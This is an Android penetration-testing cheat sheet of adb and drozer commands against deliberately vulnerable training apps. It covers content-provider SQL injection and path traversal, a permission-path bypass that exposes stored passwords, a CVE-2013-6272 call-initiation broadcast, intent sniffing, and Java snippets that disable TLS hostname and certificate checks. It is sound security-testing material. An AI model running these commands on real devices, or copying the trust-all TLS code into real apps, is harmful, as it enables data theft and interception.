<h1> Android Hacking Notes </h>

- grep for "HostnameVerifier", "X509TrustManager"
- grep for "setJavaScriptEnabled" , "WebView" , "loadUrl", "onReceivedSslError"
- grep for "Runtime.getRuntime().exec"
- grep for "DocumentBuilder", "XMLReader", "SAXParser", "XMLStreamReader"
- grep for "System.loadLibrary", "System.load", "DexClassLoader"
- grep for "Cipher.getInstance", "getInstance", "NoPadding", "NullCipher()", "AES/CBC/PKCS5Padding", "DES/CBC"
- grep for "getExternalStoragePublicDirectory"


-----
<b>Get a screenshot:</b>

```adb shell screencap -p | perl -pe 's/\x0D\x0A/\x0A/g' > screen.png```

-----

<b>Creating an URL Handler Scheme:</b>

```<activity android:name=".MyUriActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="myapp" android:host="path" />
    </intent-filter>
</activity>
```


- The <data> element defines the scheme myapp;
- It requires an action;
- It requires at least one category;
- It BROWSABLE is defined, it means it can be triggered through the browser;

//////////////////////////////////////////////////////////////////////////////////////

<b>Get the current SDK version:</b>

```$ adb shell grep ro.build.version.sdk= system/build.prop
ro.build.version.sdk=25
```

<b>Extract Manifest and Data from the apk:</b>

aapt -> Android Asset Packaging Tool

- aapt l -a app.apk
- apktool d test.apk // decompile
- apktool b test // compile

<b>ADB CheatSheet:</b>

- adb devices -> list devices
- adb -s <device> command -> execute command over a specific device
- adb connect ip:port -> connect to that device
- adb install path-to-apk
- adb push /path/to/local/file /path/on/android/device
- adb pull /path/on/android/device /path/to/local/file
- adb shell
- adb shell <command>
- adb forward tcp:<local_port> tcp:<device_port> //Forward a TCP port on the local host to a port on the device
- adb forward tcp:8083 localabstract:appsocket // Forward TCP port to a local unix socket in the phone
- adb logcat // View the device logs


```shell@android:/ $ pm list packages -> ask the package manager to list all the installed packages
shell@android:/ $ pm path <package_name> -> Find the stored APK path of an installed application
shell@android:/ $ pm install /path/to/apk
shell@android:/ $ pm uninstall <package_name>
shell@android:/ $ pm disable <package_name>
```

- logcat is a privileged tool that allows you to view system and application logs with flexible filters.
```shell@android:/ $ logcat
shell@android:/ $ logcat -s tag -> If you know the name of the tag you are looking for
```

---------------

```shell@android:/ $ getprop -> get system properties
shell@android:/ $ dumpsys -> dump status of all system information and services 
shell@android:/ $ service list
```

<b>Drozer commands:</b>

```$ adb forward tcp:31415 tcp:31415
$ drozer console connect
```

```dz> run app.package.debuggable --> Find debuggable applications```

```dz> run app.package.list -f insecure
dz> run app.package.info -a com.android.insecurebankv2
dz> run app.package.manifest com.android.insecurebankv2
dz> run app.package.attacksurface com.android.insecurebankv2
dz> run app.activity.info -a com.android.insecurebankv2
dz> run app.activity.start --component com.android.insecurebankv2 com.android.insecurebankv2.ViewStatement
```

```dz> run app.package.list -p android.permission.READ_SMS -> search for applications that requested an specific permission```


- To find query paths of Content Providers of an APP:

```dz> run app.provider.finduri com.android.insecurebankv2```

- To Query content providers:

```dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
dz> run app.provider.query content://settings/system
dz> run app.provider.query content://sms
```

- Inserting into Content providers:

```dz> run app.provider.insert content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ --integer id 2 --string name n3k
dz> run app.provider.insert content://com.mwr.example.sieve.DBContentProvider/Passwords  --integer _id 3 --string service Facebook --string username tyrone --string password zA76WR9mURDNNEw4TUiidVKRuKLEamg5h84T --string email tyrone@gmail.com 
```

```dz> run app.package.shareduid -u 10005  --> list applications sharing that UID```

- Auditing the whole application set:

```dz> run app.package.backup  --> looks for what applications allow to do backups of their data```

<b>Remote Loading of Code:</b>

Look from where is the code being loaded

- DexClassLoader (String dexPath, String dexOutputDir, String libPath, ClassLoader parent)

Find pre-installed applications that allow to install new packages:

```dz> run app.package.list -p android.permission.INSTALL_PACKAGES```

- Look for "android:sharedUserId" among apks

- In addition to simply starting each exposed activity, you should review the onCreate() method of each in search of conditional statements that may lead to other code paths or unexpected behavior. You can never know what kinds of Easter eggs are hiding in this method that could cause the application to perform an action that is completely out of character, like taking one of the parameters from the intents and using it as part of an operating system command that it executes.

- Fragment Injection: All exported activities that extend PreferenceActivity and are running on Android 4.3 or prior are vulnerable. This attack was mitigated by Android in versions 4.4 onward by providing a new method in the PreferenceActivity class named isValidFragment() to allow developers to override it and validate which fragments can be loaded inside the activity. Performing poor validation on the fragment name supplied to this method or simply returning true in this method without performing any checks would still result in fragment injection attacks being possible.

- Content providers were the only application component that was exported by default on Android, but this situation has since been amended in API version 17. Note that the default behavior is still to export a content provider if the android:targetSdkVersion is set to a value smaller than 17, and so these issues are still prevalent.

```final Cursor query( 
       Uri uri, 
       String[] projection, 
       String selection, 
       String[] selectionArgs, 
       String sortOrder);
```

```select projection from table_name(uri) where selection=selectionArgs order by sortOrder```

```dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ --projection "'"
unrecognized token: "' FROM names ORDER BY name" (code 1): , while compiling: SELECT ' FROM names ORDER BY name
```

```dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ --projection "* from sqlite_master where type='table'--"
```
```| type  | name             | tbl_name         | rootpage | sql                                                                            |
| table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                    |
| table | names            | names            | 4        | CREATE TABLE names (id INTEGER PRIMARY KEY AUTOINCREMENT,  name TEXT NOT NULL) |
| table | sqlite_sequence  | sqlite_sequence  | 5        | CREATE TABLE sqlite_sequence(name,seq)                                         |
```

- You can automate the detection of SQL injection vulnerabilities using drozer in conjunction with the scanner.provider.injection module.

```dz> run scanner.provider.injection -a content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
	Not Vulnerable:
	  No non-vulnerable URIs found.
```

- Injection in Projection:

```content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/```

- Injection in Selection:

```content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ ```

```dz> run scanner.provider.sqltables -a content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ 

	Accessible tables for uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/:
	  android_metadata
	  names
	  sqlite_sequence
```

- File-Backed Content Providers


Implementing a content provider that allows other applications to retrieve files in a structured and secure way is possible. However, the mechanisms for doing so can be prone to vulnerabilities that allow the retrieval of arbitrary files under the UID of the content provider’s application. You can programmatically create these content providers by implementing a public ParcelFileDescriptor openFile(Uri, String) method. If the URI being requested is not strictly validated against a whitelist of allowed files or folders, this opens up the application to attack. An easy way to check whether a content provider allows the retrieval of any file is by requesting the /system/etc/hosts file, which always exists and is word readable on Android devices. The following example shows how to exploit one such content provider in Sieve to retrieve /system/etc/hosts:

```dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/system/etc/hosts

127.0.0.1 localhost
```

```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db > database.db
```

A scanner module in drozer allows you to detect directory traversal attacks against file-backed content providers as shown here:

```dz> run scanner.provider.traversal -a content://com.mwr.example.sieve.FileBackupProvider ```
...

Vulnerable Providers:

```content://com.mwr.example.sieve.FileBackupProvider```

- Pattern-Matching Flaws

In all aspects of computer security, logic flaws can exist. Rewinding back to where we discovered information about the Sieve content providers, have a look again at the type of comparison being used to define a permission on the /Keys path:

```
  Authority: com.mwr.example.sieve.DBContentProvider 
    Read Permission: null 
    Write Permission: null 
    Content Provider: com.mwr.example.sieve.DBContentProvider 
    Multiprocess Allowed: True 
    Grant Uri Permissions: False 
    Path Permissions: 
      Path: /Keys 
        Type: PATTERN_LITERAL 
        Read Permission: com.mwr.example.sieve.READ_KEYS 
        Write Permission: com.mwr.example.sieve.WRITE_KEYS 
```
The comparison is done using a literal check. You can find the original form of this check that drozer parsed out in the following snippet of Sieve’s manifest:

```<provider name=".DBContentProvider" 
              exported="true" 
              multiprocess="true" 
              authorities="com.mwr.example.sieve.DBContentProvider"> 
      <path-permission readPermission="com.mwr.example.sieve.READ_KEYS" 
                       writePermission="com.mwr.example.sieve.WRITE_KEYS" 
                       path="/Keys"> 
      </path-permission> 
    </provider> 
 ```   
On the <path-permission> tag, the path attribute was used. The definition of the path attribute is as follows from http://developer.android.com/guide/topics/manifest/path-permission-element.html:

A complete URI path for a subset of content provider data. Permission can be granted only to the particular data identified by this path...


The key word in this definition is particular. This means that only the /Keys path is being protected by this permission. What about the /Keys/ path? Querying the /Keys path you get a permission denial:

```dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys 
Permission Denial: reading com.mwr.example.sieve.DBContentProvider uri content://com.mwr.example.sieve.DBContentProvider/Keys from pid=1409,  uid=10059 requires com.mwr.example.sieve.READ_KEYS, or  grantUriPermission() 
```

But when you query the /Keys/ path you get the following:

```dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ 
	| Password                | pin  | 
	| Thisismylongpassword123 | 1234 | 
```

This specific path including the appended slash was not protected by that permission. This is because a literal comparison was used when there were other valid forms that reached the same data. Many other different types of pattern-matching flaws could exist in an application that the reader would have to assess on a case-by-case basis; however, this serves as an easy introduction to this vulnerability class on Android.

- Services
- Unprotected Started Services:

If a service is exported, either explicitly or implicitly, other applications on the device can interact with it. Started services are ones that implement the onStartCommand() method inside its class. This method receives intents destined for this service from applications and may be a source of vulnerabilities for an attacker. This is completely dependent on what the code does inside this function. The code may perform an unsafe task even just by being started or may use parameters that are sent and when certain conditions take place, perform an unexpected action. To interact with started services use the app.service.start module in drozer.

André Moulu blogged about how a completely unprivileged application with no permissions can escalate privileges in order to install another package by abusing application components.

Let us zoom into one of the vulnerabilities that he used so you can see how to copy an arbitrary file to the SD card and thus overcome the need for the WRITE_EXTERNAL_STORAGE permission.

He discovered that a started service was exported in com.android.clipboardsaveservice that could be used to copy a file from one location to another. This package also held the WRITE_EXTERNAL_STORAGE permission, meaning that it could also copy to the SD card. Here is the proof of concept given by André:

```dz> run app.service.start --action com.android.clipboardsaveservice.CLIPBOARD_SAVE_SERVICE --extra string copyPath /sdcard/bla --extra string pastePath /sdcard/restore/
```

- Unprotected Bound Services:

Bound services provide a mechanism for applications on a device to interconnect directly with each other using remote procedure calls (RPCs). Bound services implement the onBind() method inside their service class. This method must return an IBinder, which is part of the remote procedure call mechanism. An application can implement a bound service in three ways, only two of which the application can use over the sandbox. These are as follows:

1) Extending the Binder class—By returning an instance of the service class in the onBind method, it provides the caller with access to public methods within the class. However, this is not possible across the sandbox and can only be bound to by other parts of the same application’s code that is running in the same process.

2) Using a messenger—By returning the IBinder of a Messenger class that has implemented a handler, the applications can send messages between each other. These messages are defined by the Message class. As part of a Message object, a “message code,” which is defined as the what variable, is specified and compared against predefined values in the class’s handler code to perform different actions according to this value. Sending arbitrary objects inside the Message object that can be used by the receiving code is also possible. However, there is no direct interaction with methods when using this technique.

3) Using AIDL (Android Interface Definition Language)—Makes methods in an application available to other applications over the sandbox using Inter-Process Communication (IPC). It performs marshalling of common Java types and abstracts the implementation from the user. The way that developers use AIDL is by populating .aidl files in the source code folder that contains information that defines an interface and during compilation time generates a Binder interface from these files. This essentially converts the human-friendly .aidl files into a Java class that can be invoked from code. Applications that have bound to a service of this nature with the correct Binder class generated from the same AIDL can make use of the remote methods available. Entire objects of custom classes can be sent using this method, as long as both the client and service have the code of this class available and the class implements the Parcelable protocol. You can explore this deeply technical method further in its documentation at http://developer.android.com/guide/components/aidl.html. For the large majority of cases, using a messenger instead of AIDL is easier and provides all that is needed to communicate across applications.

- Attacking a Messenger Implementation

The attack surface of each service depends on what is being exposed by the technique in use. The easiest starting point for examining bound services making use of messengers is reading the handleMessage() method in the service code. This tells you what kinds of messages are expected and how the application executes different functions accordingly. After you discover an attack path, you can investigate and interact with it from drozer using the app.service.send module.

- Broadcast Receivers
- Unprotected broadcast receivers:

Applications can make use of the sendBroadcast()method and send broadcasts whose impact is determined completely by what code is run in the onReceive()method of the broadcast receivers that receive the sent intent. This applies in exactly the same way for broadcast receivers that have been registered at runtime using the registerReceiver()method. To discover broadcast receivers that have been registered at runtime you must search through the code of the application; drozer will not find them using the app .broadcast.info module.

Broadcasts were intended to reach one or more recipients, unlike the sending of intents to other components which only ends up at a single recipient. This lead to the design decision that any application can broadcast an intent (as long as it’s not a predefined protected intent) and it is up to the broadcast receiver to specify what permission the source application must hold in order for the broadcast receiver to acknowledge this intent as valid. This also works the same in the other direction. When broadcasting an intent, you can specify that only applications that hold a certain permission can receive the intent.

CVE-2013-6272 INITIATE OR TERMINATE CALLS WITHOUT APPROPRIATE PERMISSIONS ON ANDROID 4.4.2 AND EARLIER:

```
dz> run app.broadcast.send --component com.android.phone com.android.phone.PhoneGlobals$NotificationBroadcastReceiver --action com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION --data-uri tel:123456789 
```

- Intent Sniffing

Intent sniffing is when a broadcast receiver can register to receive broadcasts that may have been intended for other applications. This is possible because some applications broadcast intents and do not define a required permission that a broadcast receiver must hold in order to receive the intent or do not provide a destination package for the intent.

You can review the source code of an application in search of intents being sent using the sendBroadcast() method and then register a receiver that catches this information from a non-privileged application. You can catch these intents in drozer using the app.broadcast.sniff module. In some cases, the information being broadcasted may not be sensitive. An example of this is an intent frequently broadcasted on Android systems with an action of android.intent .action.BATTERY_CHANGED. This intent simply gives information about the state of the battery. Catching this intent in drozer looks like this:

```dz> run app.broadcast.sniff --action android.intent.action.BATTERY_CHANGED ```

https://www.isecpartners.com/tools/mobile-security/intent-sniffer.aspx

- Disabling HostnameVerifier
- Trhough code:
```
	final static HostnameVerifier NO_VERIFY = new HostnameVerifier() 
	{ 
		public boolean verify(String hostname, SSLSession session) 
		{ 
				  return true; 
		} 
	}; 
```

- Built-in HostnameVerifier:
```
	HostnameVerifier NO_VERIFY = org.apache.http.conn.ssl.SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER;


	URL url = new URL("https://www.example.com"); 
	HttpsURLConnection conn = (HttpsURLConnection) url.openConnection(); 
	conn.setHostnameVerifier(NO_VERIFY);
```

- For all Applications HTTPS connections:

```HttpsURLConnection.setDefaultHostnameVerifier(NO_VERIFY);```

- TrustManager

The TrustManager’s job is to ensure that the information provided by the server matches conditions deemed acceptable to establish a trusted connection. The following code completely nullifies this check:

```	
	TrustManager[] trustAllCerts = new TrustManager[] { 
	new X509TrustManager() 
	{ 
	 
		public java.security.cert.X509Certificate[] getAcceptedIssuers() 
		{ 
			return new java.security.cert.X509Certificate[] {}; 
		} 
		public void checkClientTrusted(X509Certificate[] chain, 
		String authType) throws CertificateException 
		{ 
	 
		} 
		public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException 
		{ 
	 
		} 
	 
	}}; 
	 
	context.init(null, trustAllCerts, new SecureRandom()); 
```	
------------
```
	X509TrustManager local1 = new X509TrustManager() 
	{ 
		public void checkClientTrusted(X509Certificate[] 
		paramAnonymousArrayOfX509Certificate, 
		String paramAnonymousString) 
		throws CertificateException { } 
	 
		public void checkServerTrusted(X509Certificate[] 
		paramAnonymousArrayOfX509Certificate, 
		String paramAnonymousString) 
		throws CertificateException { } 
	 
		public X509Certificate[] getAcceptedIssuers() 
		{ 
			return null; 
		} 
	}; 
```

- WebViews

A WebView is an embeddable application element that allows web pages to be rendered within an application. It makes use of web rendering engines for the loading of web pages and provides browser-like functionality. Similarly to native code, ignoring SSL errors when loading content is possible. A callback can be overridden in the WebViewClient class that handles SSL errors and is named onReceivedSslError. This callback by default cancels the loading of the page if the SSL certificate failed one of the checks performed on it and was found to be invalid. Developers may not be able to meet these conditions during development and may choose to override the check instead

```@Override 
public void onReceivedSslError(WebView view, SslErrorHandler handler, 
SslError error) 
{ 
    handler.proceed(); 
} 
```

- Start Drozer programatically:

First we need to get the resolution used:

```$ adb shell dumpsys window displays```

```WINDOW MANAGER DISPLAY CONTENTS (dumpsys window displays)
  Display: mDisplayId=0
    init=1440x2560 640dpi cur=1440x2560 app=1440x2560 rng=1440x1344-2560x2464
    deferred=false layoutNeeded=false
```

Then, on an emulated device with that same resolution, we need to get the exact X Y position of where the on/off button is:

- am start -n com.mwr.dz/.activities.MainActivity

To capture cursor position in the screen

- adb shell getevent -l

...Then touch the screen

```/dev/input/event5: EV_ABS       ABS_MT_PRESSURE      00000001
/dev/input/event5: EV_ABS       ABS_MT_POSITION_X    0000051d
/dev/input/event5: EV_ABS       ABS_MT_POSITION_Y    00000915
/dev/input/event5: EV_SYN       SYN_MT_REPORT        00000000
/dev/input/event5: EV_SYN       SYN_REPORT           00000000
```

To send the same touch programatically:

``` adb shell input tap 1309 2325```
